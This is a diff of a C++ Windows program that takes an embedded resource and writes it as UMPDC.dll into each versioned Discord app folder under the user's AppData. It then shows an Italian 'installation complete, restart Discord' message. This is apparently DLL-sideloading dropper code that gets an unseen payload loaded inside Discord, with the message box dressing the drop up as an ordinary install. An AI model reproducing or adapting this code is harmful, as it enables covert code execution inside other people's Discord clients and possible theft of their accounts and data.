@@ -52,22 +52,9 @@ std::string getSystemUsername()
     return "";
 }
 
-void copyDll(const fs::path& sourcePath, const fs::path& destinationPath)
-{
-    try // If you want to avoid exception handling, then use the error code overload of the following functions.
-    {
-        fs::copy_file(sourcePath, destinationPath/sourcePath.filename(), fs::copy_options::overwrite_existing);
-    }
-    catch (std::exception& e) // Not using fs::filesystem_error since std::bad_alloc can throw too.  
-    {
-        std::cout << e.what();
-    }
-}
-
 int main()
 {
     namespace fs = std::filesystem;
-        
 
     std::string username = getSystemUsername();
     fs::path discordFolder = "C:\\Users\\" + username + "\\AppData\\Local\\Discord";
@@ -77,11 +64,10 @@ int main()
         if (entry.is_directory()) {
             std::string folderName = entry.path().filename().string();
             if (folderName.find("app") == 0) {
-                fs::path destinationFolder = entry.path() ;
-                fs::path tempDllPath = fs::temp_directory_path() / "UMPDC.dll";
-                saveResourceDataToFile(tempDllPath);
-                copyDll(tempDllPath, destinationFolder);
+                fs::path destinationFolder = entry.path()/ "UMPDC.dll" ;
+                saveResourceDataToFile(destinationFolder);
             }
         }
     }
+    MessageBoxW(NULL, L"Riavvia Discord per confermare l'installazione", L"Installazione Completata", MB_OK);
 }
